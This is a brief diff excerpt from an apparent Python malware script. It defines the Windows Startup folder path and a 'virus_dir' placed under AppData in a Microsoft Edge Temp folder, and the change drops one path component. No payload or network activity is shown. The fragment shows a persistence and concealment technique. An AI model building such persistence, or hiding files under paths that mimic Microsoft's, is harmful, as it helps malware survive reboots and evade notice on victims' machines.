@@ -7,7 +7,6 @@ appdata = os.environ['APPDATA']
 shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 virus_dir = os.path.join(
     appdata, 
-    "Local", 
     "Microsoft", 
     "Edge", 
     "Temp"
